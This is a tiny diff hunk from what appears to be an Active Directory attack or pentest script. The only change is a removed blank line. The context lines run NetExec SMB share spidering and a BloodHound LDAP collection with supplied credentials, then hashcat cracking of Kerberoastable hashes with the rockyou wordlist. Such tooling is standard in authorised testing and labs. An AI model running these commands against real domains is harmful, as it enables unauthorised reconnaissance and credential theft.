@@ -73,7 +73,6 @@ nxc smb $target -u "$username" -p "$password" -M spider_plus
 echo "Run Bloodhound Ingester"
 nxc ldap $target -u "$username" -p "$password" --bloodhound --collection ALL
 
-
 echo "Start Cracking Kerberoastable Hashes"
 hashcat -m 13100 kerberoasting.txt /usr/share/wordlists/rockyou.txt -O
 
